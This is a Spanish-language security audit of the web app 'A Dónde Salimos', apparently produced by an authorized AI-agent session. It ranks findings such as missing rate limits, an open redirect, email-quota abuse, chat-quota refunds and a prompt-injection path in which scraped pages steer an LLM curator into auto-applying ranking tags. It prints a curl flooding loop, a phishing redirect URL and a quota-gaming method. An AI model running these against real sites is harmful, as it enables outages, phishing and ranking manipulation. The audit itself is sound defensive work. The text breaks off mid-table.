# Auditoría de seguridad — `A Dónde Salimos`

> **Fecha:** 2026-08-18 · **Commit auditado:** `30059c5` · **Sesión:** Opus, ítem 8 de la cola post-v2
> (`docs/product/BACKLOG.md` § *Cola post-v2*). **Autorizada por Fer** sobre su propia app, con
> criterio de hacker ético.
>
> **Método:** 8 agentes en paralelo, uno por dimensión (análisis estático), + **5 verificadores
> adversariales** cuyo trabajo era *refutar* los hallazgos que mandan el ranking. Lo que no
> sobrevivió está en § *Refutados*, que es tan parte del entregable como los hallazgos.
> **Pruebas activas solo contra dev** (`localhost:5178` / `https://adondesalimos.ngrok.app`).
> **Cero payloads contra producción.** Cero llamadas a las APIs pagas (Google, Anthropic, Resend).
>
> **El ranking es por explotabilidad real en ESTA app, no por severidad de catálogo.** Un endpoint
> anónimo que quema el presupuesto vale más que un XSS que necesita ser admin.

---

## Resumen ejecutivo

**No hay ninguna vulnerabilidad de robo de datos ni de escalada de privilegios.** Las tres
preguntas que más pesaban se contestaron que **no**: no se puede tocar el recurso de otro usuario
(cero IDOR en 36 handlers), no se puede inyectar SQL (ni de primer ni de segundo orden), y **no se
puede conseguir premium sin pagar** (el webhook de MP es fail-closed, re-consulta a MP y resuelve
el usuario desde su propia fila, nunca del body).

**Lo que sí está expuesto es el presupuesto y la disponibilidad**, y siempre por la misma raíz: hay
un rate-limit bien diseñado en las rutas de API y **no hay nada delante de las páginas**. Los tres
hallazgos de arriba los ejecuta un anónimo, sin cuenta, con `curl`, a costo cero para él.

**El patrón que más se repite no es un bug, es una asimetría:** Google y Anthropic tienen contador
y tope que degradan; **Resend no tiene ninguno de los dos**, y es el único cuyo agotamiento *rompe*
la app en vez de degradarla. _(Cerrado el 2026-08-18 con `SEC-05` (c): `email_api_usage` +
`email_recipient_daily` + `email.monthly_cap` / `email.daily_per_recipient` — ver § *Fixes aplicados
en la segunda sesión*.)_

---

## Las tres verificaciones que necesitaban a Fer — **contestadas 2026-08-18**

| # | Qué se preguntó | Respuesta | Consecuencia |
|---|---|---|---|
| **V-1** | ¿Está seteada `TRUSTED_IP_HEADER`? | **Sí, está seteada** | ✅ **`SEC-03` baja a teórico.** Los cupos son por IP de verdad; el bucket global compartido no ocurre. Queda solo el fail-fast como red por si algún día se borra |
| **V-2** | ¿`DISABLE_RATE_LIMIT` está seteada en Vercel? | **No está seteada** | ✅ Es **el estado correcto**: el código compara `=== 'true'`, así que ausente = rate-limit encendido. **No hay que agregarla** — hacerlo solo crea la chance de que un día quede en `true`. El fix de `SEC-12` se aplicó igual, para que producción se niegue a obedecerla aunque aparezca |
| **V-3** | `R2_PUBLIC_URL`, ¿subdominio propio o `r2.dev`? | **Pendiente** — en dev es `pub-…​.r2.dev` (verificado) | Si en producción también termina en `.r2.dev`, `SEC-13` se queda donde está. Si fuera `algo.adondesalimos.com.ar`, sube (mismo eTLD+1) |

Y una consulta read-only que ya tiene herramienta: **`npm run prod:check`** reporta los valores
reales de `google.details_monthly_cap` / `photos_monthly_cap` y `ai.chat_monthly_cap` en Neon, que
en el código no están (`SEC-02`, `SEC-10`).

---

## Tabla de hallazgos

Estado: **CONFIRMADO EN VIVO** = lo reproduje contra dev · **CONFIRMADO** = verificado en código y
sobrevivió a un refutador · **CON CORRECCIONES** = el mecanismo sobrevivió pero la cifra o el
alcance cambiaron · **CONDICIONAL** = depende de V-1/V-2/V-3.

| ID | Hallazgo | Quién lo hace | Impacto | Estado |
|---|---|---|---|---|
| `SEC-01` | La home cuesta 59-74 sentencias SQL y no tiene rate-limit (lo barato está protegido, lo caro no) | anónimo | indisponibilidad + quema Neon Free | **CONFIRMADO** (medido) · 🔧 **mitigado en parte** |
| `SEC-02` | `/api/lugar/[id]/google`: US$108 y 30 días de fichas degradadas | anónimo | US$108/mes + disponibilidad | **CON CORRECCIONES** · ✅ **ARREGLADO** |
| `SEC-03` | Sin `TRUSTED_IP_HEADER` los cupos colapsan a un bucket compartido | anónimo | login/alta/reset caídos por instancia | **TEÓRICO** — V-1 confirmó que está seteada |
| `SEC-04` | Open redirect en `/login` vía `callbackUrl` | anónimo | phishing con el dominio real | **CONFIRMADO EN VIVO** · ✅ **ARREGLADO Y RE-VERIFICADO** |
| `SEC-05` | El alta se cierra sola y la pantalla miente (+ reenvío sin sesión, + pre-hijacking) | anónimo | alta cerrada, en silencio | **CONFIRMADO** · ✅ **ARREGLADO Y VERIFICADO EN VIVO** |
| `SEC-06` | Cortar el SSE devuelve el cupo del chat ya pagado | 1 cuenta free | chat apagado para todos | **CON CORRECCIONES** · ✅ **ARREGLADO** |
| `SEC-07` | Inyección de prompt en la curaduría → tags auto-aplicados → orden | dueño de un sitio | manipulación del ranking | **CON CORRECCIONES** (hoy teórico) · ✅ **ARREGLADO** |
| `SEC-08` | `.env.example` versionado con la contraseña real del Postgres de dev | quien lea el repo | credencial en el historial | **CONFIRMADO EN VIVO** · 🤝 **riesgo ACEPTADO** (ambiente privado; se reabre si el repo deja de ser privado) |
| `SEC-09` | `shadcn` en `dependencies` arrastra 10 de 15 vulnerabilidades; `next` con 9 advisories | — | superficie de dependencias | **CONFIRMADO EN VIVO** · ✅ **ARREGLADO** (commit aparte) |
| `SEC-10` | El tope del chat cuenta mensajes, no tokens: ~US$96 contra ≤US$20 declarados | logueado | 5× el presupuesto | **CON CORRECCIONES** |
| `SEC-11` | Cero headers de seguridad en toda la app | — | sin segunda línea de defensa | **CONFIRMADO EN VIVO** |
| `SEC-12` | `DISABLE_RATE_LIMIT` no mira `NODE_ENV`, y `.env.example` lo trae en `true` | — | apaga todo el rate-limit | **CONFIRMADO** · ✅ **ARREGLADO** |
| `SEC-13` | El tipo de las fotos se cree, nunca se comprueba (sin magic bytes) | dueño aprobado | abuso de hosting | **CONFIRMADO** · ✅ **ARREGLADO** |
| `SEC-14` | Cursor manipulado devuelve 500 en vez de degradar | anónimo | ruido de logs | **CONFIRMADO EN VIVO** · ✅ **ARREGLADO** |
| `SEC-15` | El tope de Google se lee y se incrementa sin lock (TOCTOU) | anónimo | overshoot de pocos dólares | **CONFIRMADO** · ✅ **ARREGLADO** |
| `SEC-16` | `MAX_BUCKETS` no es un tope: dispara una poda O(n) por request | anónimo | CPU, depende de `SEC-03` | **CONFIRMADO** |
| `SEC-17` | `maxDuration` declarado en una sola ruta; el resto queda en 300 s | anónimo | concurrencia y GB-horas | **CONFIRMADO** · ✅ **ARREGLADO** |
| `SEC-18` | El webhook de MP no valida la ventana temporal de la firma (replay) | requiere firma capturada | bajo (es idempotente) | **CONFIRMADO** · ✅ **ARREGLADO** |
| `SEC-19` | `payer_email` sale del body y nunca se compara con la sesión | logueado | dato de identidad no verificado | **CONFIRMADO** · ✅ **ARREGLADO** |
| `SEC-20` | SSRF en el crawler de curaduría (sigue redirects sin allowlist) | dueño de un sitio | preventivo, no alcanzable por HTTP | **CONFIRMADO** · 🔧 **la validación duplicada, unificada**; el SSRF sigue abierto (no alcanzable) |
| `SEC-21` | Sin normalización de email: `+N@gmail.com` son cuentas distintas | anónimo | granja de trials del chat | **CONFIRMADO** · ✅ **ARREGLADO** (de otra forma: ver § *tercera sesión*) |
| `SEC-22` | `GET /api/votaciones/[token]` es público, hace 5 queries y no tiene cupo | anónimo | suma a `SEC-01` | **CONFIRMADO** · ✅ **ARREGLADO** |
| `SEC-23` | Las 9 rutas `/api/admin/*` devuelven 403; las páginas devuelven 404 | anónimo | enumeración, cosmético | **CONFIRMADO** |
| `SEC-24` | El buscador de usuarios de `/admin` no escapa `%` ni `_` en el `ilike` | admin | ~nulo | **CONFIRMADO** · ✅ **ARREGLADO** |
| `SEC-25` | `chat_messages` guarda el prompt literal sin política de retención | — | deuda de datos, no vulnerabilidad | **CONFIRMADO** |

---

## Detalle

### `SEC-01` · La home cuesta 59-74 sentencias SQL y nadie la limita

**Dónde:** [`app/page.tsx:54`](../../app/page.tsx#L54) · [`lib/search/chips.ts:205-213`](../../lib/search/chips.ts#L205-L213) · [`lib/search/query.ts:270-273`](../../lib/search/query.ts#L270-L273) · ausencia de `middleware.ts` en la raíz.

**Qué es.** El rate-limit de esta app vive **dentro** de cada route handler de `app/api/**`. No hay
`middleware.ts`, así que **las páginas no pasan por ningún límite**. Y la home es, por lejos, la
operación más cara del sistema.

Medido con el log de sentencias de Postgres en dev (activado y revertido, `log_min_duration_statement`
volvió a `-1`), contando sentencias entre marcadores:

| Request | Sentencias | Tiempo de Postgres |
|---|---|---|
| `GET /` (anónima, sin parámetros) | **59** | **426,2 ms** |
| `GET /?z=palermo-soho&t=bar` | **74** | **528,0 ms** |
| `GET /api/search?z=…&t=bar` *(con rate-limit)* | 12 | 27,1 ms |
| `GET /lugar/[id]` | 8 | 2,0 ms |

El amplificador son **18 `countPlaces`** (17 chips + «Para ahora»), y **cada uno son 3 sentencias
secuenciales**, no una: leer el umbral de `app_settings`, resolver los tags, y recién ahí el
`count(*)` agregado sobre los 18.994 publicados. De ahí 54 de las 59. El umbral se lee **20 veces
por render** porque `getConfidenceThreshold` **no está dedupeado con `React.cache`**, a diferencia
de `getPlaceDetail` y `getCadenas`, que sí lo están.

**Lo que hace a esto un hallazgo y no una obviedad: el perfil de protección está invertido.**
`/api/search` cuesta 12 sentencias y **tiene** cupo de 60/min. La home cuesta 74 y **no tiene
ninguno**. Un atacante que quiera cargar la base no usa la API: usa la home, que es más barata de
pedir y ~20× más cara de servir. El cupo de `/api/search` no acota el peor camino.

**Cómo se explota.**
```bash
while true; do curl -s -o /dev/null "https://adondesalimos.com.ar/?z=palermo-soho" & done
```
Sin cuenta, sin cookie, sin headers especiales. No hay 429 posible.

**Impacto.** Indisponibilidad, que en un plan gratis es el daño más barato de causar: 426-528 ms de
CPU de Postgres por hit anónimo contra un Neon Free de 0,25 CU y 100 CU-h/mes. No solo degrada:
**quema el presupuesto de compute del mes**. Y `app/robots.ts` permite `/`, así que un crawler bien
portado ya paga 426 ms de base por pasada, sin que haya atacante.

**Fix.** Dos piezas, separables:
- **Barata y sin cambio de semántica (~15 min):** `React.cache` sobre `getConfidenceThreshold`,
  siguiendo el patrón que ya existe en `getCadenas`. Baja 59 → ~42 sentencias. El `UPDATE` sin
  redeploy se conserva, porque `React.cache` dedupea *dentro* de un render, no entre requests.
- **Estructural:** el rate-limit tiene que correr **antes** de la página, o sea `middleware.ts` (en
  Vercel corre en el edge y no gasta función). Y los 18 `count(*)` piden un agregado precomputado o
  una decisión de producto. Medio día.

**No verificable desde el código:** si Vercel Hobby aplica algún techo L7 por IP (mirar el panel de
Firewall), y cuántas requests concurrentes hacen falta para tumbarla — eso se mide con una prueba de
carga contra **una branch de staging de Neon**, nunca contra prod.

---

### `SEC-02` · El enriquecimiento de Google: US$108 y un mes de fichas degradadas

**Dónde:** [`app/api/lugar/[id]/google/route.ts:28`](../../app/api/lugar/[id]/google/route.ts#L28) · [`lib/lugar/enrichment.ts:141-149`](../../lib/lugar/enrichment.ts#L141-L149) · [`lib/middleware/rate-limit.ts:208-210`](../../lib/middleware/rate-limit.ts#L208-L210).

**Qué es.** Es el único endpoint anónimo de la app con costo monetario directo. `force-dynamic`,
`cache: 'no-store'` y **cero dedupe** (decisión de ToS, no un olvido): N requests al mismo id son N
eventos pagos. Y `checkGoogleRateLimit` llama a `checkIpRateLimit(request, 'ficha-google')` **sin
pasar `max`**, así que hereda los 60/min de la búsqueda. El comentario de esa función dice
*«Endpoint distinto, cupo distinto»* — pero lo único distinto es el **bucket**, no el **límite**. Es
el único de los 13 cupos del archivo que no declara valores propios, siendo el único que cuesta
plata por request.

**La cifra, corregida por el refutador.** El primer análisis decía «US$97/hora». **Es engañoso.** Con
los precios que **sí están en el código** ([`lib/admin/costos.ts:36-40`](../../lib/admin/costos.ts#L36-L40): details US$20/1.000,
photos US$7/1.000, tier gratis 1.000 por SKU):

```
Hora 1 = 3.600 requests → details 2.600 × 0,020 + photos 2.600 × 0,007 = US$70,20
Minuto 60 → 83,3       → 1.400 × 0,027                                 = US$37,80
   el cap de 5.000 se agota a los 83 minutos
TOTAL = US$108,00 · Hora 2 en adelante = US$0,00
```

**No son US$97 por cada hora: son US$108 una sola vez por mes calendario**, con techo duro (el reset
es por `to_char(current_date,'YYYY-MM')`). El US$97/h ignoraba el tier gratis.

**Y por eso se rankea como disponibilidad, no como costo.** Los topes **degradan de verdad**
—verificado: `contarUso` → comparar → `return SIN_DATOS` **antes** del `fetch`— así que la decisión
19 de FICHA funciona como fue diseñada. El daño que queda es que un ataque **que le cuesta US$0 al
atacante** deja **todas las fichas de la app sin horarios, sin rating y sin foto hasta 30 días**, y
es repetible el 1º de cada mes.

**Detalle que amplía la superficie:** el 99,87% del catálogo está en `pending`, no en `matched` —y
un `pending` **también gasta**: hace el Text Search gratis, persiste el match y sigue derecho al
Details pago. Elegir un id al azar sirve igual.

**Hallazgo adjunto:** el resolver (Text Search IDs-Only) **no tiene tope ni contador**, por diseño,
porque hoy es US$0. Es el único camino de la app hacia Google sin techo, y su gratuidad es una
asunción sobre el pricing de Google que no está bajo control del repo. Barrer los 26.020 `pending`
dispara 26.020 Text Search + 26.020 `UPDATE` a `places` sin ningún gate.

**Fix (1 línea, el mejor costo/beneficio del informe).** Darle su propia constante al cupo:
`checkIpRateLimit(request, 'ficha-google', 10, 60_000)`. Nadie abre 60 fichas por minuto. Sube de
83 minutos a ~8 horas el tiempo de agotar la cuota. **Bajar los caps no sirve: agranda la superficie
de DoS.**

---

### `SEC-03` · Sin `TRUSTED_IP_HEADER`, el fail-closed se da vuelta

**Dónde:** [`lib/middleware/get-client-ip.ts:20-21`](../../lib/middleware/get-client-ip.ts#L20-L21) · [`lib/middleware/rate-limit.ts:175-180`](../../lib/middleware/rate-limit.ts#L175-L180).

**Qué es.** El diseño es deliberadamente fail-closed y **está bien**: sin la variable no se lee
ningún header, así que **spoofear la IP no sirve de nada**. El problema es la otra punta. Sin la
variable, `getClientIp` devuelve `'unknown'` para todas las requests, y el escape de
`rate-limit.ts:178` solo aplica **fuera** de producción. En producción la clave del cupo pasa a ser
literalmente `auth:unknown` — un bucket por prefijo para todo el mundo.

Con `AUTH_MAX = 20`/hora, eso son **20 POST a `/api/auth` por hora en total**, no por IP. Veinte
requests anónimas cierran el login nuevo, el registro y el reset.

**Corregido por el refutador — el impacto es menor de lo que parecía:** el `Map` es del proceso, así
que tumba **una instancia lambda** por una hora, no el planeta; y el límite corre **solo en POST**
(el `GET` del catch-all se exporta crudo), así que **las sesiones ya abiertas siguen funcionando**.
Se cae el alta, no la app.

**Estado: CONDICIONAL, y no por falta de análisis.** Lo busqué: `docs/specs/active/DEPLOY.md:78`
declara la decisión y `:199` la marca con un ✅ en la tabla *«qué viaja a Vercel»* — pero ese ✅
significa *«debe copiarse»*, no *«se copió»*. **Ninguno de los 21 casos `DEPLOY-01..21` verifica el
rate-limit ni esta variable** (`DEPLOY-14` hace la comprobación inversa: que los valores no aparezcan
en el bundle). Y el `.env` de dev no la tiene, así que en desarrollo nunca se ejercitó — el guard de
`NODE_ENV` es justamente lo que impide que la falta se note. **Es la verificación V-1.**

**Fix.** Si está seteada, no hay nada que hacer en código. Igual conviene un fail-fast al arrancar si
`NODE_ENV === 'production'` y la variable está vacía (~4 líneas): convierte un DoS silencioso en un
error de deploy. Y **`DEPLOY` F2 (Upstash) no arregla esto solo** — si la clave sigue saliendo de un
header ausente, Redis cuenta prolijamente un único bucket.

---

### `SEC-04` · Open redirect en `/login` — **reproducido en vivo**

**Dónde:** [`app/(auth)/login/page.tsx:30`](../../app/(auth)/login/page.tsx#L30) y [`:62`](../../app/(auth)/login/page.tsx#L62).

**Qué es.** `callbackUrl` sale crudo de `searchParams.get()` y va directo a
`window.location.assign()`, sin ninguna validación de que sea una ruta relativa. Es el **único**
camino de redirección de la app que no pasa por better-auth: el de `/registro` entrega el valor a
`signUp.email({ callbackURL })` y ahí el `originCheckMiddleware` lo valida contra `trustedOrigins`.
El login se saltea esa red entera porque redirige del lado del cliente.

**Reproducido** contra dev con Playwright y la cuenta `pepe@gmail.com`:

```
GET https://adondesalimos.ngrok.app/login?callbackUrl=https://example.com/robado
→ login exitoso → el browser termina en example.com
```

La página de login renderiza normal con el parámetro malicioso y hasta lo propaga al link de
«Registrate».

**Impacto.** Phishing de credenciales con la señal de confianza jugando **a favor** del atacante: la
víctima ve `adondesalimos.com.ar`, con HTTPS y el formulario legítimo, se loguea, y aterriza en un
clon que le dice «tu sesión expiró, reingresá la contraseña». Y esta app **se distribuye por links
pegados en grupos de WhatsApp** (es el loop viral de INVITACION): un link al dominio real circulando
en un grupo es exactamente el patrón que los usuarios ya aceptan sin mirar.

**La variante que NO existe:** probé `callbackUrl=javascript:document.title='EJECUTADO-XSS'` y **no
ejecutó** (título vacío, URL sin cambiar). Chrome bloquea `location.assign('javascript:')`. **Es open
redirect, no XSS** — ver § *Refutados*.

**Fix (~20 min con test).** Tres líneas, en `/login` y `/registro` para que no diverjan:
```ts
const crudo = searchParams.get('callbackUrl') ?? '/'
const callbackUrl = crudo.startsWith('/') && !crudo.startsWith('//') ? crudo : '/'
```
El `!crudo.startsWith('//')` no es opcional: `//evil.tld` es protocol-relative y `assign()` lo trata
como absoluto. Por § *Una regla, un dueño*, esto pide vivir en `lib/navegacion/` — hoy `volver.ts` es
dueño de *«¿back o subir?»* y **nadie** es dueño de *«¿este destino es nuestro?»*.

---

### `SEC-05` · El alta se cierra sola, en silencio, y la pantalla miente

**Dónde:** [`lib/auth/index.ts:96-101`](../../lib/auth/index.ts#L96-L101) · [`lib/email/index.ts:66-68`](../../lib/email/index.ts#L66-L68) · `app/(auth)/registro/page.tsx:68-73`.

Son tres cosas que comparten raíz y conviene tratarlas juntas.

**(a) El modo de falla silencioso — lo más grave, y no necesita atacante.** Si Resend falla o agota
la cuota, `sendVerificationEmail` tira, y `lib/auth/index.ts` **se lo traga con un `console.error`**.
El sign-up devuelve **200**, la pantalla muestra *«revisá tu mail»*, y el usuario queda **creado, sin
verificar, sin poder loguear** (`requireEmailVerification: true`) **y sin poder re-registrarse** (cae
en la rama del duplicado genérico, que también devuelve 200 y muestra lo mismo). **Verifiqué que no
existe ninguna UI de reenvío** en toda la app. Quien cae ahí no tiene salida. Con que Resend tenga un
mal día, el alta queda cerrada y nadie se entera.

**(b) El vector de abuso — y no es el obvio.** El primer análisis decía que se podía spamear a
cualquier tercero con sign-up. **El refutador lo tumbó:** a un email ya registrado, better-auth
devuelve una respuesta duplicada genérica **sin mandar nada**, así que a una víctima concreta le
llega **un solo mail en toda la vida** por esa vía. El vector real es otro:
**`POST /api/auth/send-verification-email` no requiere sesión** — si el usuario existe y está sin
verificar, manda el mail igual. Encadenado: 1 sign-up + N reenvíos = N+1 mails al mismo buzón.

**(c) Pre-hijacking de cuenta.** El atacante crea la fila con **una contraseña que él eligió**. Si la
víctima toca «Verificar mi email», la cuenta con su dirección queda verificada y **el atacante puede
loguearse**. La mitigación actual es solo el copy (*«Si no creaste una cuenta, podés ignorar este
mail»*).

**La cuota contra la que se juega: NO ESTÁ EN EL CÓDIGO.** El «100/día» del primer análisis es
inventado. Lo único documentado es `DEPLOY.md:50`: *«~3.000 mails/mes **(verificar al configurar)**»*
— y ese *verificar* nunca se ejecutó. A 480/día se agota el mes en ~6 días.

**La asimetría de fondo:** Google tiene `google_api_usage` + sus dos caps; la IA tiene
`ai_api_usage` + `ai.chat_monthly_cap`. **Resend no tiene ni contador ni tope.** Es el único
proveedor externo cuyo agotamiento rompe la app en vez de degradarla, y es justo el que no tiene
medidor.

**Fix.** Por partes: **(a)** propagar el error del envío al cliente y agregar UI de reenvío — es el
más importante y no es de seguridad, es de resiliencia; **(b)** cupo de mails por destinatario en DB
(3/día) + contador global con kill switch, con el mismo patrón que ya existe para Google y la IA;
**(c)** se mitiga solo con (a)+(b). Media jornada el conjunto.

> ✅ **ARREGLADO el 2026-08-18** (a, b y c), verificado en vivo. El detalle —y por qué el plan de
> (a) no se podía aplicar tal cual— en § *Fixes aplicados en la segunda sesión*. El **pre-hijacking
> sigue abierto**: (a)+(b)+(c) lo acotan, no lo cierran.

---

### `SEC-06` · Cortar el SSE devuelve el cupo del chat ya pagado

**Dónde:** [`lib/ai/chat.ts:84-255`](../../lib/ai/chat.ts#L84) (el `try`/`catch` único) · [`lib/ai/cupo.ts:166-186`](../../lib/ai/cupo.ts#L166-L186).

**Qué es.** El `try` del turno envuelve todo —la llamada a Anthropic, el streaming y las escrituras—
y un `catch` único llama a `revertirReserva` **sin distinguir en qué punto falló**. O sea, no separa
«Anthropic no respondió» (donde devolver el cupo es correcto) de «Anthropic respondió, cobró, y algo
posterior falló». Si el cliente cortó, `controller.enqueue` tira, cae al catch, y se decrementa
`chat_trial_used`. Los tokens ya se facturaron.

**Verificado empíricamente por el refutador**, no inferido: corrió el repro en Node v22 y `enqueue`
tras la cancelación tira `TypeError: Controller is already closed`. Y el camino de Next existe
(`pipe-readable.js` hace `pipeTo` con un signal que aborta en el `close` del socket). No hay handler
`cancel()` ni `AbortSignal` en todo `lib/ai/` (grep = 0), así que la llamada a Anthropic **sigue
corriendo entera** aunque nadie escuche.

**Corregido:** *«chat gratis ilimitado»* es falso. `ai_api_usage` (el contador global) **no se
revierte** —está declarado a propósito— así que el atacante **se autolimita**. El daño real es
**denegación de servicio**: una sola cuenta free quema los 500 mensajes globales del mes y deja a
todos, **premium incluidos**, con el 503 `CHAT_PAUSADO` hasta el 1º. Costo para Fer: hasta ~US$11.

**El exploit útil no es el que parece.** `curl --max-time 1` es el *peor* para el atacante: gasta
plata sin recibir la respuesta. El bueno es leer el SSE hasta el evento de lugares y cortar **antes**
del `[DONE]`: respuesta completa recibida, tokens facturados, cupo devuelto.

**Y se dispara sin atacante:** `chat-client.tsx:300` hace `fetch` sin `AbortController`. Un usuario
normal que **cierra la pestaña a mitad de respuesta recupera su mensaje de trial**.

**Colaterales:** el mensaje del assistant se inserta antes del catch y el revert borra el del
usuario, así que la conversación queda con una respuesta sin pregunta; y el `enqueue` del mensaje de
error vuelve a tirar, dejando una unhandled rejection.

**Fix (~40 min).** Un flag `llamadaEmitida = true` apenas vuelve el primer `finalMessage()`, y hacer
el revert condicional a `!llamadaEmitida`. Complementario: handler `cancel()` en el `ReadableStream`
para dejar de generar tokens cuando el cliente se va.

> ✅ **ARREGLADO el 2026-08-18**, las dos partes. Ver § *Fixes aplicados en la segunda sesión*.

---

### `SEC-07` · Inyección de prompt en la curaduría → tags auto-aplicados → orden

**Dónde:** [`lib/curation/fetch-sitio.ts:85-97`](../../lib/curation/fetch-sitio.ts#L85-L97) · [`lib/curation/sugeridor.ts:161`](../../lib/curation/sugeridor.ts#L161) y `:128-141` · [`lib/curation/suggestions.ts:65-67`](../../lib/curation/suggestions.ts#L65-L67) · [`lib/search/query.ts:80-82`](../../lib/search/query.ts#L80-L82) y `:101-103`.

**Qué es.** El crawler de curaduría scrapea hasta 2 URLs de `places.websites`/`socials`, convierte el
HTML a texto y lo pega en el prompt con un header `[Fuente: url]` pero **sin cierre, sin fence y sin
marca de que sea dato**. El system prompt del sugeridor **no tiene ninguna regla anti-inyección** —a
diferencia del prompt del chat, que la tiene literal en `lib/ai/prompts.ts:114`, y que además tiene
un candado *estructural* (`grounding.ts` descarta ids inventados aunque el modelo obedezca). La
curaduría no tiene equivalente.

Y la salida **no la mira nadie**: `guardarSugerencias` auto-aplica a `place_tags` con `source='admin'`
y marca `accepted` toda sugerencia cuyo `evidence` sea un string no vacío. **La cita nunca se compara
contra el texto scrapeado** (grep completo: `evidence` solo se persiste, se lee para la cola y se
muestra). El modelo puede inventar la cita entera y se auto-aplica igual.

La cascada: cualquier tag `source='admin'`, **uno solo**, pone `curadoRank` en 1 y sube la banda de
2 a 3. Medido: en «Un café · Palermo Soho» hay 130 publicados con tag `cafe` y **3 curados** — saltar
de banda te mete entre los primeros 4 de 130.

**Correcciones importantes del refutador:**
- **No es «todas las búsquedas sin GPS»:** con texto, `simKey` es la primera clave y la banda solo
  desempata. Es en navegación por **chip/zona** donde la banda manda — pero ahí el análisis original
  se quedaba **corto**: como `ownerRank` vale 1 para **3 lugares en 26.058**, la banda es *de facto*
  la primera clave de orden de ese camino.
- **Contención real:** solo puede auto-asignarse tags de `ambiente`/`momento`/`actividad`, validados
  contra el vocabulario. No puede tocar `tipo`, `cocina` ni `precio`, ni inventar slugs.
- **El eslabón débil es la selección, y el atacante no lo controla.** Entran 1.840 de 15.660
  elegibles (11,7%) por cuota de 40 por zona, ordenados en la práctica por `confidence` desc puro
  (`tieneContacto` lo cumple el 98,8%, así que no discrimina). **Tener web no te sube ni un puesto.**
  Y de esos 1.840, **1.200 ya están curados** ⇒ no ganan banda. La ventana real es de ~640 lugares,
  fija y enumerable con una query.
- **Superficie de disparo: solo CLI.** Cero rutas HTTP; necesita que Fer corra `npm run curar`, hoy
  postergado por falta de usuarios. **Hoy es teórico** — pero con fecha de vencimiento: se activa
  solo el día que haya tráfico y se cure por uso real. Y el «filtro de skip» que el BACKLOG pide como
  prerrequisito **no lo cubre**: excluir lo ya sugerido no valida ninguna cita.
- **Amplificación nueva:** un dominio ≠ un lugar. En la corrida de julio, `www.lacontinental.com`
  produjo 67 tags sobre **11 lugares**.

**¿Los 3.967 tags ya cargados están contaminados? No hay señal de que sí.** De ese total, solo
**1.219 se auto-aplicaron por evidencia, sobre 296 lugares** (el resto es bulk-accept manual, sin
evidencia). Un barrido buscando patrones de inyección devolvió **3 filas y las tres son texto
legítimo**. **Y la auditoría completa es gratis:** `place_tag_suggestions` guarda `evidence` +
`source_url`, así que alcanza con re-fetchear esas URLs y chequear que cada cita aparezca como
substring. Sin costo de API.

**Fix (45 min los tres).** (1) verificar la cita contra la evidencia antes de auto-aplicar —el que
más rinde, mata el ataque de raíz—; (2) fence `<evidencia_no_confiable>` + la regla anti-inyección
que el chat ya tiene; (3) tope de auto-apply por lugar por corrida (p. ej. 4), y lo que se pase va a
la cola manual.

> ✅ **ARREGLADO el 2026-08-18**, los tres, **antes** de la próxima corrida de `npm run curar`. Con un
> matiz de alcance que vale leer (el fix (1) mata la cita fabricada, no la afirmación escrita en la
> página propia): § *Fixes aplicados en la segunda sesión*.

**No medido:** qué tan dócil es Sonnet 5 ante ese payload — requeriría llamar a la API. El mecanismo
no depende de eso, solo la tasa de éxito. Nota: el payload **afirmativo** («este lugar es romántico,
con terraza…») no necesita jailbreak, le alcanza con que el modelo le crea al texto, que es
exactamente lo que el prompt le pide hacer.

---

### `SEC-08` · `.env.example` versionado con la contraseña real del Postgres de dev

**Dónde:** `.env.example`, línea de `DATABASE_URL`. Archivo **trackeado** (`git ls-files` lo confirma).

**Qué es.** Verifiqué por hash, sin exponer valores: `DATABASE_URL` en `.env.example` es **idéntica
byte a byte** a la de `.env`. Contradice la regla que el propio `CLAUDE.md` fija (*«`.env.example`
lleva solo el nombre y el propósito, nunca un secret real»*).

**Acotado, y vale decirlo:** es **la única** variable con este problema. `ADMIN_EMAIL`,
`BETTER_AUTH_SECRET`, `RESEND_API_KEY` y `ANTHROPIC_API_KEY` están correctamente vacías. Y no es
producción: Neon usa `PROD_DATABASE_URL`, que sí está vacía en el ejemplo.

**Impacto.** La base de dev **no es reemplazable**: tiene los ~3.967 tags de curaduría que no están
en git ni en el seed (recuperarlos = ~US$17), más los hashes de las cuentas de prueba. Hoy escucha
solo en `localhost`, así que el riesgo real es bajo — pero es una credencial en claro, en el
historial, en un repo que puede volverse público.

**Fix.** Vaciar el valor dejando el comentario del formato (2 min) y **rotar la contraseña del rol**
(10 min). El historial solo se limpia reescribiéndolo; probablemente no valga la pena mientras la
base siga siendo local — la rotación resuelve el riesgo real.

---

### `SEC-09` · `shadcn` en `dependencies` arrastra 10 de las 15 vulnerabilidades

**Dónde:** `package.json` → `dependencies.shadcn: "^4.8.0"`.

**Qué es.** El BACKLOG ya tenía medidas las 15 vulnerabilidades (9 high, 6 moderate) y lo confirmé.
Lo que no estaba medido es **de quién cuelgan**, y ahí el hallazgo cambia de forma:
**`shadcn@4.13.1` está en `dependencies` en vez de `devDependencies`**. Es un CLI de scaffolding:
**no se importa desde ninguna línea** de `app/`, `lib/`, `components/` ni `scripts/` (grep = 0), y ni
siquiera existe `components.json`.

De él cuelgan `undici`, `hono`, `@hono/node-server`, `ip-address`, `js-yaml`, `fast-uri` y
`brace-expansion`: **10 de las 15**. En particular, **el `undici` que el BACKLOG marcaba como
preocupante (*cross-user information disclosure*) nunca estuvo en el runtime de la app**.

Lo que queda es real y de runtime: **`next@16.2.6` con 9 advisories** (entre ellas *Unauthenticated
disclosure of internal Server Function endpoints* y *SSRF in rewrites*), más `sharp` y `postcss`, que
cuelgan de Next. Fix disponible en `16.3.1`, **no es semver-major**.

**Fix.** Mover `shadcn` a `devDependencies` (o sacarlo: se puede usar con `npx`) y subir Next a
`16.3.1`. **Con typecheck + tests + build de testigo**, no a ciegas — y son dos cambios separados,
para que si algo rompe se sepa cuál fue.

---

### `SEC-10` · El tope del chat cuenta mensajes, no tokens

**Dónde:** [`lib/ai/chat.ts:28-32`](../../lib/ai/chat.ts#L28-L32) (`VENTANA=12`, `MAX_RONDAS_TOOL=5`, `MAX_TOKENS=1024`) · [`lib/ai/cupo.ts:128-131`](../../lib/ai/cupo.ts#L128-L131).

**Qué es.** Un turno son **hasta 5 llamadas completas** a la API (verificado: el `for` invoca
`messages.stream` una vez por iteración, sin condición), cada una re-enviando el historial, y el
cupo suma **1** sin mirar tokens.

**Cifras corregidas** — el primer análisis se equivocó ~11× porque usó el default del seed (5.000) en
vez del valor de **producción, que es 500** (`DEPLOY.md:403`, `AnalisisQA.md:3513`,
`OPERAR-EN-PRODUCCION.md:69`):

| | Real, con cap = 500 |
|---|---|
